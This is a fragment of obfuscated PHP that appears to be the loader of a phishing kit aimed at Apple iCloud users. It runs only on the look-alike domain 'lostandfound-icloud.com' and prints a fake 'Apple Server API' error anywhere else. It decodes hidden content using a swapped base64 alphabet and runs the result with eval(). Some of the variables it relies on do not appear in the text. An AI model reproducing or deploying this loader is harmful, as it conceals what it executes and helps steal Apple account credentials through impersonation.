

<?php while (!preg_match('#^((.*\.)?lostandfound-icloud\.com)$#i', $O000OO00O = (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($HTTP_SERVER_VARS['SERVER_NAME']) ? $HTTP_SERVER_VARS['SERVER_NAME'] : (isset($HTTP_SERVER_VARS['HTTP_HOST']) ? $HTTP_SERVER_VARS['HTTP_HOST'] : '')))))) die($O000OO00O . ': Apple Server API is not allowed for this domain. Please contact Apple Support.');
$OO00O00O0 = str_replace('__FILE__', "'" . $OOO0O0O00 . "'", $GLOBALS['OOO0000O0']($GLOBALS['OOO00000O']($GLOBALS['O0O00OO00']($O000O0O00, $OO00O0000), 'QEvf6CzmkFiIHBytAPKnrbMhU+oDT0a8Y5LjcwR41d/eslZJpGqV2W7ug3ONXxS9=', 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/')));
fclose($O000O0O00);
eval($OO00O00O0);

